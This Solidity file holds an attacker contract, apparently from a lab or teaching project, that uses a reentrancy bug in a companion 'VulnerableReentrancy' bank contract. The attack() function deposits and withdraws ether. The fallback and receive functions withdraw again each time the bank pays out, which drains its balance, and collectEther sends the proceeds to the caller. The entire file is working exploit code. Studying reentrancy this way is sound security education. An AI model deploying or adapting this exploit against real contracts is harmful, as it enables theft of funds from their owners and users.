// SPDX-License-Identifier: MIT

pragma solidity ^0.8.24;

import {VulnerableReentrancy} from "./VulnerableReentrancy.sol";

contract VulnerableAttacker {
    VulnerableReentrancy public vulnerableBank;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableReentrancy(_vulnerableBankAddress);
    }

    fallback() external payable {
        if (address(vulnerableBank).balance >= 0.0001 ether) {
            vulnerableBank.withdraw(0.0001 ether);
        }
    }

    receive() external payable {
        if (address(vulnerableBank).balance >= 0.0001 ether) {
            vulnerableBank.withdraw(0.0001 ether);
        }
    }

    function attack() public payable {
        require(msg.value >= 0.0001 ether, "Need to send at least 0.0001 ether");
        vulnerableBank.deposit{value: msg.value}();
        vulnerableBank.withdraw(msg.value);
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}